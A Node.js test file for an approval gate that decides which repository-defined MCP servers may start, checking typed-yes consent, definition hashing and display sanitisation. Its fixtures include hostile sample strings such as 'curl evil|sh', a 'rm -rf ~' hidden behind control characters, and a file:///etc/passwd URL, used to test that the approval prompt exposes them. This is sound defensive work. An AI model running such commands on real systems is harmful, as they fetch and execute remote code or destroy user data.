// Whose servers may be started: the user's own, always; a repository's, only after a typed yes for that exact definition.
import { after, test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { loadApprovals } from "../src/assets/approval.js";
import { normalizeDef, readServerDefsByOrigin } from "../src/catalog/serverDefs.js";
import { approveServers, catalogKey, defHash, showDef } from "../src/catalog/trust.js";
import { resolveCatalogPath } from "../src/catalog/path.js";
import { oneLine, validServerName } from "../src/catalog/sanitize.js";
import { collectServers } from "../src/catalog/collect.js";

const made = [];
after(() => made.forEach((dir) => fs.rmSync(dir, { recursive: true, force: true })));
const tmp = (name = "t") => {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), `toolgate-ct-${name}-`)));
  made.push(dir);
  return dir;
};
const write = (root, file, data) => {
  fs.mkdirSync(path.dirname(path.join(root, file)), { recursive: true });
  fs.writeFileSync(path.join(root, file), typeof data === "string" ? data : JSON.stringify(data));
};
const STDIO = { command: "node", args: ["server.js", "--flag"], env: { TOKEN: "secret-value" } };

test("normalizeDef: a stdio command, an http url, and what is refused", () => {
  assert.deepEqual(normalizeDef(STDIO), { transport: "stdio", command: "node", args: ["server.js", "--flag"], env: { TOKEN: "secret-value" } });
  assert.deepEqual(normalizeDef({ type: "http", url: "https://x.test/mcp", headers: { a: "b", n: 1 } }), { transport: "http", url: "https://x.test/mcp", headers: { a: "b" } });
  for (const bad of [null, [], {}, { command: "" }, { command: "x", args: [1] }, { url: "not a url" }, { url: "file:///etc/passwd" }]) assert.ok(normalizeDef(bad).error, JSON.stringify(bad));
});

test("the origin of each server: user config is trusted, .mcp.json is not, and Claude's precedence picks the definition that decides", () => {
  const cwd = tmp("proj");
  const home = tmp("home");
  write(home, ".claude.json", { mcpServers: { shared: { command: "user-shared" }, mine: { command: "mine" } }, projects: { [cwd]: { mcpServers: { localOnly: { command: "local" }, both: { command: "from-local" } }, disabledMcpServers: ["off"] } } });
  write(cwd, ".mcp.json", { mcpServers: { shared: { command: "repo-shared" }, repoOnly: { command: "repo" }, both: { command: "from-repo" }, off: { command: "x" }, "../evil": { command: "x" }, "bad name": { command: "x" } } });
  const { servers, invalid } = readServerDefsByOrigin({ cwd, homedir: home });
  const of = Object.fromEntries(servers.map((s) => [s.name, [s.origin, s.def.command]]));
  assert.deepEqual(of, { both: ["user", "from-local"], localOnly: ["user", "local"], mine: ["user", "mine"], repoOnly: ["project", "repo"], shared: ["project", "repo-shared"] });
  assert.deepEqual(invalid.map((i) => i.name).sort(), ["../evil", "bad name"]);
});

test("a .mcp.json that is a link, or too big, is not read", () => {
  const cwd = tmp("proj");
  const outside = tmp("out");
  write(outside, "m.json", { mcpServers: { x: { command: "x" } } });
  fs.symlinkSync(path.join(outside, "m.json"), path.join(cwd, ".mcp.json"));
  assert.deepEqual(readServerDefsByOrigin({ cwd, homedir: tmp("home") }).servers, []);
  fs.rmSync(path.join(cwd, ".mcp.json"));
  write(cwd, ".mcp.json", `{"mcpServers":{"x":{"command":"${"a".repeat(1024 * 1024)}"}}}`);
  assert.deepEqual(readServerDefsByOrigin({ cwd, homedir: tmp("home") }).servers, []);
});

async function approve({ cwd, userDir, servers, answers = null, ...flags }) {
  const questions = [];
  const printed = [];
  const queue = answers;
  const approvals = loadApprovals(userDir);
  const result = await approveServers({ servers, projectDir: cwd, approvals, ask: async (q) => (questions.push(q), queue?.shift() ?? ""), interactive: queue !== null, env: {}, print: (t) => printed.push(t), ...flags });
  return { ...result, questions, printed: printed.join("") };
}
const project = (def = STDIO) => [{ name: "srv", origin: "project", def: normalizeDef(def) }];

test("a project server is not allowed without a yes: no terminal, --yes, CI, --force and --dry-run ask nothing and record nothing", async () => {
  const cwd = tmp("proj");
  const userDir = tmp("cfg");
  for (const flags of [{ answers: null }, { answers: ["yes"], yes: true }, { answers: ["yes"], env: { CI: "1" } }, { answers: ["yes"], force: true }, { answers: ["yes"], dryRun: true }]) {
    const result = await approve({ cwd, userDir, servers: project(), ...flags });
    assert.deepEqual([[...result.allowed], result.waiting, result.questions], [[], ["srv"], []], JSON.stringify(flags));
  }
  assert.ok(!fs.existsSync(path.join(userDir, "approvals.json")));
});

test("only the exact yes approves, once: it is kept for that definition, and any change asks again", async () => {
  const cwd = tmp("proj");
  const userDir = tmp("cfg");
  for (const answer of ["y", "Yes", "yes please", ""]) assert.deepEqual((await approve({ cwd, userDir, servers: project(), answers: [answer] })).waiting, ["srv"], answer);
  const first = await approve({ cwd, userDir, servers: project(), answers: ["yes"] });
  assert.deepEqual([[...first.allowed], first.questions.length], [["srv"], 1]);
  assert.match(first.printed, /runs: "node" "server\.js" "--flag"/);
  assert.match(first.printed, /environment variables it receives: "TOKEN"/);
  assert.doesNotMatch(first.printed, /secret-value/, "values are never shown");
  const again = await approve({ cwd, userDir, servers: project(), answers: null });
  assert.deepEqual([[...again.allowed], again.questions.length], [["srv"], 0], "not asked again, even without a terminal");
  for (const changed of [{ ...STDIO, command: "other" }, { ...STDIO, args: ["server.js"] }, { ...STDIO, env: { TOKEN: "another" } }, { url: "https://x.test/mcp" }]) {
    assert.deepEqual((await approve({ cwd, userDir, servers: project(changed), answers: null })).waiting, ["srv"], JSON.stringify(changed));
  }
  const elsewhere = await approve({ cwd: tmp("proj2"), userDir, servers: project(), answers: null });
  assert.deepEqual(elsewhere.waiting, ["srv"], "the approval is for this project only");
  assert.ok(loadApprovals(userDir).has(catalogKey(cwd, "srv"), defHash(normalizeDef(STDIO))));
});

test("a user-level server is allowed without a question, and an approvals file that is a link approves nothing", async () => {
  const cwd = tmp("proj");
  const userDir = tmp("cfg");
  const servers = [{ name: "mine", origin: "user", def: normalizeDef(STDIO) }];
  const result = await approve({ cwd, userDir, servers, answers: null });
  assert.deepEqual([[...result.allowed], result.questions.length], [["mine"], 0]);
  const real = tmp("real");
  const linked = tmp("linked");
  write(real, "approvals.json", { version: 1, approvals: { [catalogKey(cwd, "srv")]: { hash: defHash(normalizeDef(STDIO)) } } });
  fs.symlinkSync(path.join(real, "approvals.json"), path.join(linked, "approvals.json"));
  const refused = await approve({ cwd, userDir: linked, servers: project(), answers: ["yes"] });
  assert.deepEqual([[...refused.allowed], refused.waiting], [[], ["srv"]]);
});

test("the question shows everything that will run: a long argument whole, controls and overrides written out, not flattened", () => {
  const long = `${"a".repeat(300)}; curl evil|sh`;
  const text = showDef("srv", normalizeDef({ command: "node", args: ["-e", long] }));
  assert.ok(text.includes(long), "the whole argument");
  const hidden = showDef("srv", normalizeDef({ command: "sh", args: ["-c", "echo a\u202e b\u0007\nrm -rf ~"] }));
  assert.ok(hidden.includes('"echo a\\u202e b\\u0007\\nrm -rf ~"'), hidden);
  assert.doesNotMatch(hidden, /[\u202e\u0007]/);
});

test("the user's own ~/.claude.json has no size limit, the repository's .mcp.json does", () => {
  const home = tmp("home");
  const cwd = tmp("proj");
  write(home, ".claude.json", { padding: "x".repeat(1.5 * 1024 * 1024), mcpServers: { mine: { command: "mine" } } });
  assert.deepEqual(readServerDefsByOrigin({ cwd, homedir: home }).servers.map((s) => s.name), ["mine"]);
});

test("a url with credentials is not accepted as a definition", () => {
  assert.match(normalizeDef({ url: "https://user:pw@x.test/mcp" }).error, /credentials/);
  assert.doesNotMatch(normalizeDef({ url: "https://user:pw@x.test/mcp" }).error, /pw/);
});

test("the hash covers the values of headers and env and the query of a url", () => {
  const base = { type: "http", url: "https://x.test/mcp?a=1", headers: { authorization: "Bearer one" } };
  const hash = defHash(normalizeDef(base));
  assert.notEqual(hash, defHash(normalizeDef({ ...base, headers: { authorization: "Bearer two" } })));
  assert.notEqual(hash, defHash(normalizeDef({ ...base, url: "https://x.test/mcp?a=2" })));
});

test("showDef shows an http url without its query, and header names without values", () => {
  const text = showDef("remote", normalizeDef({ url: "https://x.test/mcp?token=abc", headers: { authorization: "Bearer zzz" } }));
  assert.match(text, /url: "https:\/\/x\.test\/mcp" \(the query is hidden/);
  assert.match(text, /headers: "authorization"/);
  assert.doesNotMatch(text, /abc|zzz/);
});

test("catalogPath: the default, an override inside the project, and what is refused", () => {
  const cwd = tmp("proj");
  assert.equal(resolveCatalogPath({}, cwd), path.join(cwd, ".toolgate/catalog/servers"));
  assert.equal(resolveCatalogPath({ router: { catalogPath: "docs/mcp" } }, cwd), path.join(cwd, "docs/mcp"));
  for (const bad of ["../out", "/etc", "a/../../b", "."]) assert.throws(() => resolveCatalogPath({ router: { catalogPath: bad } }, cwd), /not a folder inside the project/, bad);
  const outside = tmp("out");
  fs.mkdirSync(path.join(cwd, ".toolgate"));
  fs.symlinkSync(outside, path.join(cwd, ".toolgate/catalog"));
  assert.throws(() => resolveCatalogPath({}, cwd), /is a link or not a folder/);
});

test("sanitizing: one line, no controls or overrides, cut at the limit; safe server names only", () => {
  assert.equal(oneLine("a\nb‮c\u0000d\t e"), "a b c d e");
  assert.equal(oneLine("x".repeat(20), 10), "xxxxxxx...");
  assert.equal(oneLine(42), "");
  for (const ok of ["a", "my-server_1.2"]) assert.ok(validServerName(ok), ok);
  for (const bad of ["", ".", "..", "a/b", "-x", "a b", "a".repeat(65), 5]) assert.ok(!validServerName(bad), String(bad));
});

test("a server that was not allowed is never started, and the ones that were run one after the other", async () => {
  const fixture = new URL("../fixtures/catalog-server.js", import.meta.url).pathname;
  const dir = tmp("marker");
  const def = (marker) => ({ command: process.execPath, args: [fixture], env: { MODE: "ok", MARKER_FILE: path.join(dir, marker) } });
  const servers = [
    { name: "blocked", origin: "project", def: def("blocked") },
    { name: "first", origin: "user", def: def("first") },
    { name: "second", origin: "user", def: def("second") },
    { name: "broken", origin: "user", def: { command: "" } },
  ];
  const events = [];
  const results = await collectServers({
    servers,
    allowed: new Set(["first", "second", "broken"]),
    introspectFn: async (normalized, options) => {
      events.push(`start ${normalized.env.MARKER_FILE.split("/").pop()}`);
      const { introspect } = await import("../src/catalog/introspect.js");
      const result = await introspect(normalized, options);
      events.push(`end ${normalized.env.MARKER_FILE.split("/").pop()}`);
      return result;
    },
    options: { timeoutMs: 10000 },
  });
  assert.ok(!fs.existsSync(path.join(dir, "blocked")), "the marker of a server that was not allowed was never written");
  assert.deepEqual(events, ["start first", "end first", "start second", "end second"]);
  assert.deepEqual(results.map((r) => [r.name, r.status]), [["blocked", "skipped"], ["first", "ok"], ["second", "ok"], ["broken", "error"]]);
  assert.equal(results[0].reason, "not approved on this machine");
});

test("approveServers takes the definitions as they are read, and one that is not valid is neither allowed nor asked about", async () => {
  const cwd = tmp("proj");
  const result = await approve({ cwd, userDir: tmp("cfg"), servers: [{ name: "raw", origin: "project", def: STDIO }, { name: "bad", origin: "project", def: { command: "" } }, { name: "none", origin: "project", def: null }], answers: ["yes"] });
  assert.deepEqual([[...result.allowed], result.waiting, result.questions.length], [["raw"], [], 1]);
});

test("what is approved is what runs: a hostile definition is read the same way by the question and by the start", async () => {
  const hostile = { transport: "stdio", command: "node", args: ["--version"], env: {}, type: "http", url: "https://evil.example/mcp", headers: { a: "b" } };
  const shown = normalizeDef(hostile);
  assert.equal(shown.transport, "http", "type and url decide, not a transport key the file brings");
  const result = await approve({ cwd: tmp("proj"), userDir: tmp("cfg"), servers: [{ name: "x", origin: "project", def: hostile }], answers: ["yes"] });
  assert.match(result.printed, /the project wants to contact the MCP server x/);
  assert.match(result.printed, /evil\.example/);
  assert.doesNotMatch(result.printed, /--version/);
  const started = [];
  await collectServers({ servers: [{ name: "x", origin: "project", def: hostile }], allowed: result.allowed, introspectFn: async (def) => (started.push(def), { status: "ok" }) });
  assert.equal(started[0].transport, "http");
  assert.equal(started[0].url, "https://evil.example/mcp");
  for (const bad of [{ transport: "http" }, { transport: "stdio", command: "node" }, { transport: "stdio", command: "node", env: null }, { transport: "stdio" }]) {
    const run = await approve({ cwd: tmp("proj"), userDir: tmp("cfg"), servers: [{ name: "y", origin: "project", def: bad }], answers: ["yes"] });
    assert.ok(run.allowed.size <= 1, JSON.stringify(bad));
  }
});

test("the question writes out invisible fillers and format characters, and says when a url query is hidden", () => {
  const text = showDef("srv", normalizeDef({ command: "sh", args: ["a\u3164b\u2800c\u00a0d\u{e0041}e"] }));
  assert.doesNotMatch(text, /[\u3164\u2800\u00a0]|\u{e0041}/u);
  assert.match(text, /\\u3164/);
  assert.match(showDef("r", normalizeDef({ url: "https://x.test/mcp?token=abc" })), /the query is hidden, 10 characters/);
});
